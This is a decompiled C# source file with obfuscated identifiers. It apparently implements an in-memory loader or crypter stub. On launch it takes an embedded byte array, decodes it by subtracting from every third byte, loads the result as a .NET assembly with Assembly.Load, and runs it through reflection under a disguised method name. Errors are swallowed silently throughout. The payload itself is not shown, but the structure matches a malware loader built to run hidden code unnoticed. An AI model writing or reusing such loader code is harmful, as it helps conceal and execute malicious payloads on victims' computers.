using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security;
using System.Windows;
using ns2;
using ns3;
using ns5;

namespace ns1;

internal class Class0 : Application
{
	[StructLayout(LayoutKind.Auto)]
	[CompilerGenerated]
	private struct Struct0
	{
		public Assembly asm;
	}

	internal static readonly byte[] array = Class2.smethod_0();

	internal static MethodInfo _methodInfo;

	internal static Assembly assembly;

	public void method_0()
	{
		try
		{
			for (int i = 0; i < array.Length; i++)
			{
				smethod_1(i);
			}
		}
		catch
		{
		}
		Struct0 struct0_ = default(Struct0);
		struct0_.asm = smethod_2(ref struct0_);
		GClass0.smethod_0(struct0_.asm);
	}

	internal static MethodInfo smethod_0(IEnumerable<TypeInfo> ienumerable_0, Type type_0)
	{
		if (ienumerable_0.Contains(type_0))
		{
			_methodInfo = type_0.GetMethod(Class1.DateTimeInfo2);
			_methodInfo.Invoke(null, null);
		}
		return _methodInfo;
	}

	public static void Main()
	{
		Class0 @class = new Class0();
		try
		{
			@class.method_0();
		}
		catch
		{
		}
	}

	[CompilerGenerated]
	internal static void smethod_1(int int_0)
	{
		if (int_0 % 3 / 1 == 0)
		{
			array[int_0] = (byte)(array[int_0] - 12 - 4);
		}
	}

	[CompilerGenerated]
	internal static Assembly smethod_2(ref Struct0 struct0_0)
	{
		_ = Assembly.GetExecutingAssembly().IsFullyTrusted;
		struct0_0.asm = Assembly.Load(array, (byte[])null, (SecurityContextSource)0);
		return struct0_0.asm;
	}
}
